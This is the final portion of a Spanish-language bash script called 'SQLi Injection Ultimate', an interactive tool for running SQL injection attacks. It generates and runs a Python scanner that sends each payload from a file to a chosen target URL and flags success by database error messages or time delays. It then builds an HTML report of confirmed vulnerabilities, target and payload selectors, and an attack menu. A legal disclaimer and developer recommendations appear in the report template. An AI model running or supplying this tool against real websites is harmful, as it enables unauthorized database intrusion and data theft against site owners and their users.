    echo -e "${YELLOW}💉 Iniciando ataque manual...${NC}"
    echo "URL: $target_url"
    echo "Tipo: $target_type"
    echo "Payloads: $(wc -l < "$selected_payload_file") entradas"
    echo ""
    
    successful_payloads=0
    total_payloads=0
    
    # Crear script Python para testing manual
    cat > "$WORKDIR/scripts/manual_sqli_test.py" << 'EOF'
#!/usr/bin/env python3
import requests
import sys
import time
import urllib.parse

def test_payload(url, payload, method='GET', data=None, cookies=None, headers=None):
    """Test a single SQL injection payload"""
    
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Encode payload
        encoded_payload = urllib.parse.quote(payload)
        
        if method == 'GET':
            # Add payload to URL parameter
            if '?' in url:
                test_url = url + '&sqli_test=' + encoded_payload
            else:
                test_url = url + '?sqli_test=' + encoded_payload
            
            response = session.get(test_url, timeout=10)
            
        elif method == 'POST':
            # Add payload to POST data
            if data:
                test_data = data + '&sqli_test=' + encoded_payload
            else:
                test_data = 'sqli_test=' + encoded_payload
            
            response = session.post(url, data=test_data, timeout=10)
        
        # Check for SQL injection indicators
        content = response.text.lower()
        
        indicators = [
            'sql syntax',
            'mysql_fetch',
            'warning: mysql',
            'error in your sql syntax',
            'ora-01756',
            'oracle error',
            'postgresql error',
            'warning: pg_',
            'mssql_query',
            'odbc_exec',
            'microsoft jet database',
            'sqlite_',
            'sqlite error',
            'database error',
            'table \'',
            'column \'',
            'unknown column',
            'syntax error',
            'mysql error',
            'you have an error',
            'supplied argument is not a valid'
        ]
        
        for indicator in indicators:
            if indicator in content:
                return True, indicator, len(content)
        
        # Check for time delay (basic)
        if response.elapsed.total_seconds() > 5:
            return True, 'time_delay', len(content)
        
        return False, 'no_error', len(content)
        
    except Exception as e:
        return False, f'error: {str(e)}', 0

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 manual_sqli_test.py <url> <payload_file> <output_file>")
        sys.exit(1)
    
    url = sys.argv[1]
    payload_file = sys.argv[2]
    output_file = sys.argv[3]
    
    print(f"Testing URL: {url}")
    print(f"Payload file: {payload_file}")
    print(f"Output: {output_file}")
    print()
    
    successful = 0
    total = 0
    
    with open(payload_file, 'r', encoding='utf-8', errors='ignore') as pf:
        payloads = [line.strip() for line in pf if line.strip() and not line.startswith('#')]
    
    with open(output_file, 'w') as of:
        of.write(f"# SQL Injection Manual Test Results\n")
        of.write(f"# URL: {url}\n")
        of.write(f"# Total payloads: {len(payloads)}\n\n")
        
        for i, payload in enumerate(payloads, 1):
            print(f"[{i}/{len(payloads)}] Testing: {payload[:50]}{'...' if len(payload) > 50 else ''}")
            
            success, indicator, content_length = test_payload(url, payload)
            
            result_line = f"{payload}|{success}|{indicator}|{content_length}\n"
            of.write(result_line)
            
            if success:
                successful += 1
                print(f"  ✅ SUCCESS: {indicator}")
            else:
                print(f"  ❌ No response")
            
            total += 1
            
            # Rate limiting
            time.sleep(1)
    
    print(f"\n📊 Summary:")
    print(f"✅ Successful: {successful}")
    print(f"📝 Total tested: {total}")
    print(f"📄 Results saved: {output_file}")

if __name__ == "__main__":
    main()
EOF

    chmod +x "$WORKDIR/scripts/manual_sqli_test.py"
    
    # Ejecutar testing manual
    python3 "$WORKDIR/scripts/manual_sqli_test.py" "$target_url" "$selected_payload_file" "$result_file"
    
    # Analizar resultados
    if [[ -f "$result_file" ]]; then
        echo ""
        echo -e "${GREEN}📊 ANÁLISIS DE RESULTADOS${NC}"
        
        successful_count=$(grep -c "|True|" "$result_file" 2>/dev/null || echo "0")
        total_count=$(grep -c "|" "$result_file" 2>/dev/null || echo "0")
        
        echo "Total payloads probados: $total_count"
        echo "Payloads exitosos: $successful_count"
        
        if [[ $successful_count -gt 0 ]]; then
            echo ""
            echo -e "${CYAN}🎉 Payloads exitosos encontrados:${NC}"
            grep "|True|" "$result_file" | head -10 | while IFS='|' read -r payload success indicator length; do
                echo "✅ $payload ($indicator)"
            done
        fi
    fi
}

# Generar reporte completo
generar_reporte_sqli() {
    echo -e "${PURPLE}📊 GENERAR REPORTE SQLI${NC}"
    echo ""
    
    report_file="$WORKDIR/reports/sqli_ultimate_report_$(date +%Y%m%d_%H%M%S).html"
    
    echo -e "${YELLOW}📝 Generando reporte HTML...${NC}"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>SQLi Injection Ultimate - Reporte</title>
    <meta charset="UTF-8">
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e);
            color: #00ff41; 
            margin: 20px; 
            line-height: 1.6;
        }
        .header { 
            text-align: center; 
            border: 2px solid #00ff41; 
            padding: 20px; 
            margin-bottom: 20px;
            background: rgba(0,255,65,0.1);
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,255,65,0.3);
        }
        .section { 
            border: 1px solid #444; 
            padding: 15px; 
            margin: 10px 0; 
            background: rgba(42,42,42,0.8);
            border-radius: 5px;
        }
        .success { color: #00ff41; font-weight: bold; }
        .warning { color: #ffaa00; }
        .error { color: #ff4444; }
        .critical { color: #ff0000; font-weight: bold; }
        .info { color: #44aaff; }
        pre { 
            background: #111; 
            padding: 10px; 
            overflow-x: auto; 
            border: 1px solid #444;
            border-radius: 5px;
            font-size: 12px;
        }
        .vuln-box {
            border: 2px solid #ff4444;
            padding: 15px;
            margin: 10px 0;
            background: rgba(255,68,68,0.1);
            border-radius: 8px;
        }
        .safe-box {
            border: 2px solid #00ff41;
            padding: 15px;
            margin: 10px 0;
            background: rgba(0,255,65,0.1);
            border-radius: 8px;
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            margin: 10px 0;
            background: rgba(0,0,0,0.3);
        }
        th, td { 
            border: 1px solid #444; 
            padding: 8px; 
            text-align: left; 
        }
        th { background: #333; color: #00ff41; }
        .payload { 
            font-family: monospace; 
            background: #222; 
            padding: 2px 4px; 
            border-radius: 3px;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🗃️ SQLI INJECTION ULTIMATE</h1>
        <h2>📊 Reporte de SQL Injection Testing</h2>
        <p><strong>Generado:</strong> $(date)</p>
        <p><strong>Directorio:</strong> $WORKDIR</p>
    </div>

    <div class="section">
        <h3>🎯 OBJETIVOS ANALIZADOS</h3>
        <table>
            <tr>
                <th>URL</th>
                <th>Tipo</th>
                <th>Método</th>
                <th>Estado</th>
            </tr>
EOF

    # Agregar información de objetivos
    if ls "$WORKDIR/targets"/*.txt >/dev/null 2>&1; then
        for target_file in "$WORKDIR/targets"/*.txt; do
            url=$(grep "URL:" "$target_file" | cut -d: -f2- | head -1)
            tipo=$(grep "TYPE:" "$target_file" | cut -d: -f2 | head -1)
            metodo=$(grep "METHOD:" "$target_file" | cut -d: -f2 | head -1)
            
            # Determinar estado basado en resultados
            if ls "$WORKDIR/results"/*$(basename "$target_file" .txt)* >/dev/null 2>&1; then
                estado="<span class=\"info\">Analizado</span>"
            else
                estado="<span class=\"warning\">Pendiente</span>"
            fi
            
            echo "            <tr>" >> "$report_file"
            echo "                <td>$url</td>" >> "$report_file"
            echo "                <td>$tipo</td>" >> "$report_file"
            echo "                <td>$metodo</td>" >> "$report_file"
            echo "                <td>$estado</td>" >> "$report_file"
            echo "            </tr>" >> "$report_file"
        done
    fi

    cat >> "$report_file" << EOF
        </table>
    </div>

    <div class="section">
        <h3>🚨 VULNERABILIDADES DETECTADAS</h3>
EOF

    # Buscar vulnerabilidades en resultados
    vuln_found=false
    if ls "$WORKDIR/results"/*.txt >/dev/null 2>&1; then
        for result_file in "$WORKDIR/results"/*.txt; do
            if grep -q "vulnerable\|True\|SUCCESS" "$result_file" 2>/dev/null; then
                vuln_found=true
                echo "        <div class=\"vuln-box\">" >> "$report_file"
                echo "            <h4 class=\"critical\">⚠️ VULNERABILIDAD CONFIRMADA</h4>" >> "$report_file"
                echo "            <p><strong>Archivo:</strong> $(basename "$result_file")</p>" >> "$report_file"
                echo "            <p><strong>Detalles:</strong></p>" >> "$report_file"
                echo "            <pre>" >> "$report_file"
                grep -A 5 -B 5 "vulnerable\|True\|SUCCESS" "$result_file" 2>/dev/null | head -20 >> "$report_file"
                echo "            </pre>" >> "$report_file"
                echo "        </div>" >> "$report_file"
            fi
        done
    fi

    if [[ "$vuln_found" == "false" ]]; then
        echo "        <div class=\"safe-box\">" >> "$report_file"
        echo "            <h4 class=\"success\">✅ NO SE DETECTARON VULNERABILIDADES OBVIAS</h4>" >> "$report_file"
        echo "            <p>Los tests realizados no detectaron vulnerabilidades SQL injection evidentes.</p>" >> "$report_file"
        echo "            <p class=\"warning\">⚠️ Esto no garantiza que el sitio esté completamente seguro.</p>" >> "$report_file"
        echo "        </div>" >> "$report_file"
    fi

    cat >> "$report_file" << EOF
    </div>

    <div class="section">
        <h3>💉 PAYLOADS PROBADOS</h3>
        <table>
            <tr>
                <th>Tipo</th>
                <th>Archivo</th>
                <th>Cantidad</th>
                <th>Exitosos</th>
            </tr>
EOF

    # Estadísticas de payloads
    if ls "$WORKDIR/payloads"/*.txt >/dev/null 2>&1; then
        for payload_file in "$WORKDIR/payloads"/*.txt; do
            filename=$(basename "$payload_file")
            total_payloads=$(grep -v '^#' "$payload_file" | grep -v '^$' | wc -l)
            
            # Buscar resultados exitosos relacionados
            successful=0
            if ls "$WORKDIR/results"/*.txt >/dev/null 2>&1; then
                for result in "$WORKDIR/results"/*.txt; do
                    successful=$((successful + $(grep -c "|True|" "$result" 2>/dev/null || echo "0")))
                done
            fi
            
            echo "            <tr>" >> "$report_file"
            echo "                <td>$(echo "$filename" | cut -d'_' -f1)</td>" >> "$report_file"
            echo "                <td>$filename</td>" >> "$report_file"
            echo "                <td>$total_payloads</td>" >> "$report_file"
            echo "                <td class=\"$([ $successful -gt 0 ] && echo "error" || echo "success")\">$successful</td>" >> "$report_file"
            echo "            </tr>" >> "$report_file"
        done
    fi

    cat >> "$report_file" << EOF
        </table>
    </div>

    <div class="section">
        <h3>📊 ESTADÍSTICAS GENERALES</h3>
        <table>
            <tr><th>Métrica</th><th>Valor</th></tr>
            <tr><td>Objetivos configurados</td><td>$(ls "$WORKDIR/targets"/*.txt 2>/dev/null | wc -l)</td></tr>
            <tr><td>Archivos de payloads</td><td>$(ls "$WORKDIR/payloads"/*.txt 2>/dev/null | wc -l)</td></tr>
            <tr><td>Archivos de bypasses</td><td>$(ls "$WORKDIR/bypasses"/*.txt 2>/dev/null | wc -l)</td></tr>
            <tr><td>Resultados generados</td><td>$(ls "$WORKDIR/results"/*.txt 2>/dev/null | wc -l)</td></tr>
            <tr><td>Scripts creados</td><td>$(ls "$WORKDIR/scripts"/* 2>/dev/null | wc -l)</td></tr>
        </table>
    </div>

    <div class="section">
        <h3>🛠️ HERRAMIENTAS UTILIZADAS</h3>
        <ul>
            <li><strong>SQLMap:</strong> $(which sqlmap 2>/dev/null || echo "No encontrado")</li>
            <li><strong>Python3:</strong> $(which python3)</li>
            <li><strong>Curl:</strong> $(which curl)</li>
            <li><strong>JQ:</strong> $(which jq 2>/dev/null || echo "No encontrado")</li>
        </ul>
    </div>

    <div class="section">
        <h3>📋 LOG DE ACTIVIDAD</h3>
        <pre>$(tail -50 "$LOG_FILE" 2>/dev/null || echo "Sin log disponible")</pre>
    </div>

    <div class="section">
        <h3>⚠️ CONSIDERACIONES DE SEGURIDAD</h3>
        <div class="warning">
            <h4>IMPORTANTE - ASPECTOS LEGALES:</h4>
            <ul>
                <li>Este reporte es para pentesting autorizado y fines educativos únicamente</li>
                <li>SQL Injection sin autorización es ILEGAL en muchas jurisdicciones</li>
                <li>Siempre obtenga permiso explícito antes de probar aplicaciones</li>
                <li>Use esta información de manera responsable y ética</li>
                <li>Reporte las vulnerabilidades encontradas de forma responsable</li>
            </ul>
        </div>
    </div>

    <div class="section">
        <h3>🔗 ARCHIVOS GENERADOS</h3>
        <ul>
            <li>📁 <strong>Directorio principal:</strong> <code>$WORKDIR</code></li>
            <li>📜 <strong>Log principal:</strong> <code>$LOG_FILE</code></li>
            <li>📊 <strong>Reporte HTML:</strong> <code>$report_file</code></li>
            <li>🎯 <strong>Resultados:</strong> <code>$WORKDIR/results/</code></li>
            <li>💉 <strong>Payloads:</strong> <code>$WORKDIR/payloads/</code></li>
            <li>🛡️ <strong>Bypasses:</strong> <code>$WORKDIR/bypasses/</code></li>
        </ul>
    </div>

    <div class="section">
        <h3>💡 RECOMENDACIONES</h3>
        <div class="info">
            <h4>PARA DESARROLLADORES:</h4>
            <ul>
                <li>Use consultas preparadas (Prepared Statements)</li>
                <li>Implemente validación y sanitización de entrada</li>
                <li>Use ORM con escapado automático</li>
                <li>Aplique principio de menor privilegio en BD</li>
                <li>Implemente logging y monitoreo de consultas</li>
                <li>Use WAF (Web Application Firewall) como capa adicional</li>
            </ul>
        </div>
    </div>
</body>
</html>
EOF

    echo -e "${GREEN}✅ Reporte generado: $report_file${NC}"
    echo -e "${CYAN}📂 Abre el archivo en un navegador para ver el reporte completo${NC}"
}

# Funciones auxiliares
select_target_sqli() {
    echo "Objetivos disponibles:"
    
    cd "$WORKDIR/targets"
    target_files=(*.txt)
    
    if [[ ${#target_files[@]} -eq 0 ]] || [[ ! -f "${target_files[0]}" ]]; then
        echo -e "${RED}❌ No hay objetivos disponibles${NC}"
        selected_target=""
        return
    fi
    
    for i in "${!target_files[@]}"; do
        url=$(grep "URL:" "${target_files[$i]}" | cut -d: -f2- 2>/dev/null || echo "Sin URL")
        tipo=$(grep "TYPE:" "${target_files[$i]}" | cut -d: -f2 2>/dev/null || echo "Desconocido")
        echo "$((i+1))) ${target_files[$i]} ($tipo - $url)"
    done
    
    read -p "Selecciona objetivo [1-${#target_files[@]}]: " selection
    
    if [[ "$selection" =~ ^[0-9]+$ ]] && [[ $selection -ge 1 ]] && [[ $selection -le ${#target_files[@]} ]]; then
        index=$((selection-1))
        selected_target="$WORKDIR/targets/${target_files[$index]}"
        echo -e "${GREEN}✅ Seleccionado: ${target_files[$index]}${NC}"
    else
        echo -e "${RED}❌ Selección inválida${NC}"
        selected_target=""
    fi
    
    cd - >/dev/null
}

select_payload_file() {
    echo "Archivos de payloads disponibles:"
    
    cd "$WORKDIR/payloads"
    payload_files=(*.txt *.md)
    
    if [[ ${#payload_files[@]} -eq 0 ]] || [[ ! -f "${payload_files[0]}" ]]; then
        echo -e "${RED}❌ No hay payloads disponibles${NC}"
        selected_payload_file=""
        return
    fi
    
    for i in "${!payload_files[@]}"; do
        if [[ -f "${payload_files[$i]}" ]]; then
            lines=$(grep -v '^#' "${payload_files[$i]}" | grep -v '^$' | wc -l 2>/dev/null || echo "?")
            echo "$((i+1))) ${payload_files[$i]} ($lines payloads)"
        fi
    done
    
    read -p "Selecciona archivo [1-${#payload_files[@]}]: " selection
    
    if [[ "$selection" =~ ^[0-9]+$ ]] && [[ $selection -ge 1 ]] && [[ $selection -le ${#payload_files[@]} ]]; then
        index=$((selection-1))
        selected_payload_file="$WORKDIR/payloads/${payload_files[$index]}"
        echo -e "${GREEN}✅ Seleccionado: ${payload_files[$index]}${NC}"
    else
        echo -e "${RED}❌ Selección inválida${NC}"
        selected_payload_file=""
    fi
    
    cd - >/dev/null
}

# Menú principal
mostrar_menu() {
    clear
    echo "
███████╗ ██████╗ ██╗     ██╗    ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗
██╔════╝██╔═══██╗██║     ██║    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝
███████╗██║   ██║██║     ██║    ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  
╚════██║██║▄▄ ██║██║     ██║    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  
███████║╚██████╔╝███████╗██║    ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
                                                                                              
🗃️ SQLI INJECTION - TODAS LAS MODALIDADES Y BYPASSES 🗃️
"

    echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}🎯 MENÚ PRINCIPAL${NC}"
    echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    echo ""
    echo "1) 🎯 Gestionar objetivos"
    echo "2) 💉 Gestionar payloads"
    echo "3) ⚔️ Configurar ataques"
    echo "4) 📊 Generar reporte"
    echo "5) 🔧 Ver configuración"
    echo "6) 🧹 Limpiar archivos temporales"
    echo "7) ❌ Salir"
    echo ""
    echo -e "${YELLOW}Directorio actual: $WORKDIR${NC}"
    echo -e "${GREEN}Objetivos: $(ls "$WORKDIR/targets"/*.txt 2>/dev/null | wc -l)${NC}"
    echo -e "${GREEN}Payloads: $(ls "$WORKDIR/payloads"/*.txt 2>/dev/null | wc -l)${NC}"
    echo -e "${GREEN}Resultados: $(ls "$WORKDIR/results"/*.txt 2>/dev/null | wc -l)${NC}"
    echo ""
}

# Función principal
main() {
    echo -e "${BLUE}🔧 Inicializando SQLi Injection Ultimate...${NC}"
    
    verificar_herramientas
    configurar_directorio
    
    # Crear payloads básicos si no existen
    if [[ ! -f "$WORKDIR/payloads/basic_payloads.txt" ]]; then
        echo -e "${YELLOW}📝 Creando payloads básicos...${NC}"
        descargar_payloads_comunes
    fi
    
    while true; do
        mostrar_menu
        read -p "Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1) gestionar_objetivos ;;
            2) gestionar_payloads ;;
            3) configurar_ataques ;;
            4) generar_reporte_sqli ;;
            5)
                echo -e "${CYAN}⚙️ CONFIGURACIÓN ACTUAL${NC}"
                echo "Directorio: $WORKDIR"
                echo "Log: $LOG_FILE"
                echo "SQLMap: $SQLMAP_BIN"
                echo "Python: $(which python3)"
                echo "Curl: $(which curl)"
                read -p "Presiona Enter para continuar..."
                ;;
            6)
                echo -e "${YELLOW}🧹 Limpiando archivos temporales...${NC}"
                find "$WORKDIR" -name "*.tmp" -delete 2>/dev/null || true
                find "$WORKDIR" -name "*.pyc" -delete 2>/dev/null || true
                echo -e "${GREEN}✅ Limpieza completada${NC}"
                read -p "Presiona Enter para continuar..."
                ;;
            7)
                echo -e "${GREEN}👋 ¡Injection completed! Hasta luego!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Opción inválida${NC}"
                read -p "Presiona Enter para continuar..."
                ;;
        esac
    done
}

# Verificar permisos
if [[ $EUID -eq 0 ]]; then
    echo -e "${YELLOW}⚠️ Ejecutándose como root${NC}"
fi

# Ejecutar función principal
main "$@"